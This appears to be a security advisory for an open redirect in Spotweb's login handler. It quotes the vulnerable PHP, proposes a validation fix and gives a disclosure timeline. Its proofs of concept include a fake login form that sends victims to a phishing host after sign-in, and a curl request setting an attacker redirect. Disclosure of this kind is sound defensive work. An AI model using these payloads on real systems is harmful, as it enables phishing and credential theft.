# Spotweb - Open Redirect Vulnerability

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Vendor** | Spotweb |
| **Product** | Spotweb |
| **Affected Versions** | All versions (tested on latest) |
| **Vulnerability Type** | Open Redirect (CWE-601) |
| **CVSS 3.1 Score** | 6.1 (Medium) |
| **CVE ID** | Pending |

## Description

An Open Redirect vulnerability exists in Spotweb. The `loginform[http_referer]` POST parameter is passed directly to the `redirect()` function without any URL validation after successful authentication. This allows attackers to redirect authenticated users to arbitrary external URLs.

## Affected Code

**File:** `templates/we1rdo/login.inc.php` (also in `templates/modern/` and `templates/mobile/`)

**Vulnerable code (lines 7-8):**
```php
if (isset($data['performredirect']) && ($result->isSuccess())) {
    $tplHelper->redirect($loginform['http_referer']);
}
```

**Hidden form field (line 41):**
```html
<input type="hidden" name="loginform[http_referer]" value="<?php echo $http_referer; ?>">
```

**File:** `lib/SpotTemplateHelper.php`

**Redirect function (line 1586-1589):**
```php
public function redirect($url)
{
    header('Location: '.$url);  // NO VALIDATION!
}
```

## Proof of Concept

### Method 1: Malicious Form

An attacker creates a phishing page with a form that submits to the target Spotweb instance:

```html
<!DOCTYPE html>
<html>
<body>
<h1>Spotweb Login</h1>
<p>Your session expired. Please login again.</p>
<form action="https://TARGET-SPOTWEB.com/?page=login" method="POST">
    <input type="text" name="loginform[username]" placeholder="Username">
    <input type="password" name="loginform[password]" placeholder="Password">
    
    <!-- Malicious redirect -->
    <input type="hidden" name="loginform[http_referer]" value="https://evil-phishing.com/steal-session">
    <input type="hidden" name="data[performredirect]" value="1">
    
    <button type="submit">Login</button>
</form>
</body>
</html>
```

### Method 2: cURL

```bash
curl -X POST "https://TARGET-SPOTWEB.com/?page=login" \
  -d "loginform[username]=validuser" \
  -d "loginform[password]=validpass" \
  -d "loginform[http_referer]=https://evil-site.com" \
  -d "data[performredirect]=1" \
  -v 2>&1 | grep -i "location"
```

**Expected output:**
```
< Location: https://evil-site.com
```

## Attack Scenario

1. Attacker creates a fake Spotweb login page
2. Victim clicks on attacker's link (e.g., via phishing email)
3. Victim enters valid credentials
4. After successful login, victim is redirected to attacker-controlled site
5. Attacker's site can:
   - Display fake "session expired" message to steal credentials again
   - Attempt session hijacking
   - Serve malware

## Impact

- **Phishing Attacks:** Redirect users to fake login pages after authentication
- **Credential Theft:** Double-login attack to harvest credentials
- **Session Hijacking:** Redirect to attacker site that captures session tokens
- **Malware Distribution:** Redirect authenticated users to malicious downloads

## CVSS 3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Base Score: 6.1 (Medium)
```

## Remediation

Add URL validation in the `redirect()` function:

```php
public function redirect($url)
{
    // Validate URL is local
    if (!$this->isLocalUrl($url)) {
        $url = $this->_settings->get('spotweburl');
    }
    
    header('Location: ' . $url);
}

private function isLocalUrl($url)
{
    if (empty($url)) {
        return false;
    }
    
    // Block dangerous URI schemes
    $scheme = parse_url($url, PHP_URL_SCHEME);
    if ($scheme && !in_array(strtolower($scheme), ['http', 'https'], true)) {
        return false;
    }
    
    // Allow relative URLs
    $parsed = parse_url($url);
    if (empty($parsed['host'])) {
        return true;
    }
    
    // Check if same host as configured spotweburl
    $spotwebHost = parse_url($this->_settings->get('spotweburl'), PHP_URL_HOST);
    return strcasecmp($parsed['host'], $spotwebHost) === 0;
}
```

## Timeline

| Date | Action |
|------|--------|
| 2026-10-27 | Vulnerability discovered |
| 2026-10-27 | VulDB submission |
| Pending | Vendor notification |
| Pending | CVE assignment |
| Pending | Public disclosure |

## References

- https://github.com/spotweb/spotweb
- https://cwe.mitre.org/data/definitions/601.html
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect

## Credit

Discovered by [0p5cur](https://github.com/0p5cur)
